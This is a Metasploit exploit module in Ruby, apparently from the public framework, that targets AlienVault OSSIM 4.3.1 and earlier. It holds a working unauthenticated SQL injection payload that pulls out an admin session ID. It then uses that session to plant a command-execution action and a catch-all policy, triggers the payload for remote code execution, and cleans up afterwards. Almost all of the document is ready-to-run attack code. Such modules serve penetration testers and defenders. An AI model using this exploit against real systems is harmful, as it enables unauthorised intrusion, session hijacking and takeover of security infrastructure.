##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "AlienVault OSSIM SQL Injection and Remote Code Execution",
      'Description'    => %q{
        This module exploits an unauthenticated SQL injection vulnerability affecting AlienVault
        OSSIM versions 4.3.1 and lower. The SQL injection issue can be abused in order to retrieve an
        active admin session ID.  If an administrator level user is identified, remote code execution
        can be gained by creating a high priority policy with an action containing our payload.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Sasha Zivojinovic', # SQLi discovery
          'xistence <xistence[at]0x90.nl>' # Metasploit module
        ],
      'References'     =>
        [
          ['OSVDB', '106252'],
          ['EDB', '33006']
        ],
      'DefaultOptions'  =>
        {
          'SSL'      => true,
          'WfsDelay' => 10
        },
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Payload'        =>
        {
          'Compat'      =>
            {
              'RequiredCmd' => 'generic perl python',
            }
        },
      'Targets'        =>
        [
          ['Alienvault OSSIM 4.3', {}]
        ],
      'Privileged'     => true,
      'DisclosureDate' => "Apr 24 2014",
      'DefaultTarget'  => 0))

      register_options(
        [
          Opt::RPORT(443),
          OptString.new('TARGETURI', [true, 'The URI of the vulnerable Alienvault OSSIM instance', '/'])
        ], self.class)
  end


  def check
    marker = rand_text_alpha(6)
    sqli_rand = rand_text_numeric(4+rand(4))
    sqli = "' and(select 1 from(select count(*),concat((select (select 
concat(0x#{marker.unpack('H*')[0]},Hex(cast(user() as char)),0x#{marker.unpack('H*')[0]})) "
    sqli << "from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by 
x)a) and '#{sqli_rand}'='#{sqli_rand}"

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'geoloc', 'graph_geoloc.php'),
      'vars_get' => { 'date_from' => sqli }
    })

    if res && res.code == 200 && res.body =~ /#{marker}726F6F7440[0-9a-zA-Z]+#{marker}/ # 726F6F7440 = root
      return Exploit::CheckCode::Vulnerable
    else
      print_status("#{res.body}")
      return Exploit::CheckCode::Safe
    end

  end


  def exploit
    marker = rand_text_alpha(6)
    sqli_rand = rand_text_numeric(4+rand(4))
    sqli = "' and (select 1 from(select count(*),concat((select (select 
concat(0x#{marker.unpack('H*')[0]},Hex(cast(id as char)),0x#{marker.unpack('H*')[0]})) "
    sqli << "from alienvault.sessions where login='admin' limit 0,1),floor(rand(0)*2))x from 
information_schema.tables group by x)a) and '#{sqli_rand}'='#{sqli_rand}"

    print_status("#{peer} - Trying to grab admin session through SQLi")

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'geoloc', 'graph_geoloc.php'),
      'vars_get' => { 'date_from' => sqli }
    })

    if res && res.code == 200 && res.body =~ /#{marker}(.*)#{marker}/
      admin_session = $1
      @cookie = "PHPSESSID=" + ["#{admin_session}"].pack("H*")
      print_status("#{peer} - Admin session cookie is [ #{@cookie} ]")
    else
      fail_with(Failure::Unknown, "#{peer} - Failure retrieving admin session")
    end

    # Creating an Action containing our payload, which will be executed by any event (not only alarms)
    action = rand_text_alpha(8+(rand(8)))
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, "ossim", "action", "modifyactions.php"),
      'cookie' => @cookie,
      'vars_post' => {
        'action' => 'new',
        'action_name' => action,
        'descr' => action,
        'action_type' => '2',
        'only' => 'on',
        'cond' => 'True',
        'exec_command' => payload.encoded
      }
    })

    if res && res.code == 200
      print_status("#{peer} - Created Action [ #{action} ]")
    else
      fail_with(Failure::Unknown, "#{peer} - Action creation failed!")
    end

    # Retrieving the Action ID, used to clean up the action after successful exploitation
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, "ossim", "action", "getaction.php"),
      'cookie' => @cookie,
      'vars_post' => {
        'page' => '1',
        'rp'   => '2000'
      }
    })

    if res && res.code == 200 && res.body =~ /actionform\.php\?id=(.*)'>#{action}/
      @action_id = $1
      print_status("#{peer} - Action ID is [ #{@action_id} ]")
    else
      fail_with(Failure::Unknown, "#{peer} - Action ID retrieval failed!")
    end

    # Retrieving the policy data, necessary for proper cleanup after succesful exploitation
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path.to_s, "ossim", "policy", "policy.php"),
      'cookie' => @cookie,
      'vars_get' => {
        'm_opt' => 'configuration',
        'sm_opt' => 'threat_intelligence',
        'h_opt' => 'policy'
      }
    })

    if res && res.code == 200 && res.body =~ /getpolicy\.php\?ctx=(.*)\&group=(.*)',/
      policy_ctx = $1
      policy_group = $2
      print_status("#{peer} - Policy data [ ctx=#{policy_ctx} ] and [ group=#{policy_group} ] retrieved!")
    else
      fail_with(Failure::Unknown, "#{peer} - Retrieving Policy data failed!")
    end

    # Creating policy which will be triggered by any source/destination
    policy = rand_text_alpha(8+(rand(8)))
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, "ossim", "policy", "newpolicy.php"),
      'cookie' => @cookie,
      'vars_post' => {
        'descr' => policy,
        'active' => '1',
        'group' => policy_group,
        'ctx' => policy_ctx,
        'order' => '1', # Makes this the first policy, overruling all the other policies
        'action' => 'new',
        'sources[]' => '00000000000000000000000000000000', # Source is ANY
        'dests[]' => '00000000000000000000000000000000', # Destination is ANY
        'portsrc[]' => '0', # Any source port
        'portdst[]' => '0', # Any destination port
        'plug_type' => '1', # Taxonomy
        'plugins[0]' => 'on',
        'taxfilters[]' =>'20@13@118', # Product Type: Operating System, Category: Application, Subcategory: Web - Not 
Found
        'tax_pt' => '0',
        'tax_cat' => '0',
        'tax_subc' => '0',
        'mboxs[]' => '00000000000000000000000000000000',
        'rep_act' => '0',
        'rep_sev' => '1',
        'rep_rel' => '1',
        'rep_dir' => '0',
        'ev_sev' => '1',
        'ev_rel' => '1',
        'tzone' => 'Europe/Amsterdam',
        'date_type' => '1',
        'begin_hour' => '0',
        'begin_minute' => '0',
        'begin_day_week' => '1',
        'begin_day_month' => '1',
        'begin_month' => '1',
        'end_hour' => '23',
        'end_minute' => '59',
        'end_day_week' => '7',
        'end_day_month' => '31',
        'end_month' => '12',
        'actions[]' => @action_id,
        'sim' => '1',
        'priority' => '1',
        'qualify' => '1',
        'correlate' => '0', # Don't make any correlations
        'cross_correlate' => '0', # Don't make any correlations
        'store' => '0' # We don't want to store anything :)
      }
    })

    if res && res.code == 200
      print_status("#{peer} - Created Policy [ #{policy} ]")
    else
      fail_with(Failure::Unknown, "#{peer} - Policy creation failed!")
    end

    # Retrieve policy ID, needed for proper cleanup after succesful exploitation
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, "ossim", "policy", "getpolicy.php"),
      'cookie' => @cookie,
      'vars_get' => {
        'ctx' => policy_ctx,
        'group' => policy_group
      },
      'vars_post' => {
        'page' => '1',
        'rp' => '2000'
      }
    })
    if res && res.code == 200 && res.body =~ /row id='(.*)' col_order='1'/
      @policy_id = $1
      print_status("#{peer} - Policy ID [ #{@policy_id} ] retrieved!")
    else
      fail_with(Failure::Unknown, "#{peer} - Retrieving Policy ID failed!")
    end

    # Reload the policies to make our new policy active
    print_status("#{peer} - Reloading Policies")
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, "ossim", "conf", "reload.php"),
      'cookie' => @cookie,
      'vars_get' => {
        'what' => 'policies',
        'back' => '../policy/policy.php'
      }
    })

    if res && res.code == 200
      print_status("#{peer} - Policies reloaded!")
    else
      fail_with(Failure::Unknown, "#{peer} - Policy reloading failed!")
    end

    # Request a non-existing page, which will trigger a SIEM event (and thus our payload), but not an alarm.
    dont_exist = rand_text_alpha(8+rand(4))
    print_status("#{peer} - Triggering policy and action by requesting a non existing url")
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, dont_exist),
      'cookie' => @cookie
    })

    if res and res.code == 404
      print_status("#{peer} - Payload delivered")
    else
      fail_with(Failure::Unknown, "#{peer} - Payload failed!")
    end

  end


  def cleanup
    begin
      # Clean up, retrieve token so that the policy can be removed
      print_status("#{peer} - Cleaning up")
      res = send_request_cgi({
       'method' => 'POST',
        'uri'    => normalize_uri(target_uri.path, "ossim", "session", "token.php"),
        'cookie' => @cookie,
        'vars_post'   => { 'f_name' => 'delete_policy' }
      })

      if res && res.code == 200 && res.body =~ /\{\"status\":\"OK\",\"data\":\"(.*)\"\}/
        token = $1
        print_status("#{peer} - Token [ #{token} ] retrieved")
      else
        print_warning("#{peer} - Unable to retrieve token")
      end

      # Remove our policy
      res = send_request_cgi({
       'method' => 'GET',
        'uri'    => normalize_uri(target_uri.path, "ossim", "policy", "deletepolicy.php"),
        'cookie' => @cookie,
        'vars_get'   => {
          'confirm' => 'yes',
          'id' => @policy_id,
          'token' => token
        }
      })

      if res && res.code == 200
        print_status("#{peer} - Policy ID [ #{@policy_id} ] removed")
      else
        print_warning("#{peer} - Unable to remove Policy ID")
      end

      # Remove our action
      res = send_request_cgi({
       'method' => 'GET',
        'uri'    => normalize_uri(target_uri.path, "ossim", "action", "deleteaction.php"),
        'cookie' => @cookie,
        'vars_get'   => {
          'id' => @action_id,
        }
      })

      if res && res.code == 200
        print_status("#{peer} - Action ID [ #{@action_id} ] removed")
      else
        print_warning("#{peer} - Unable to remove Action ID")
      end

    # Reload the policies to revert back to the state before exploitation
    print_status("#{peer} - Reloading Policies")
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, "ossim", "conf", "reload.php"),
      'cookie' => @cookie,
      'vars_get' => {
        'what' => 'policies',
        'back' => '../policy/policy.php'
      }
    })

    if res && res.code == 200
      print_status("#{peer} - Policies reloaded!")
    else
      fail_with(Failure::Unknown, "#{peer} - Policy reloading failed!")
    end

    ensure
      super # mixins should be able to cleanup even in case of Exception
    end
  end

end
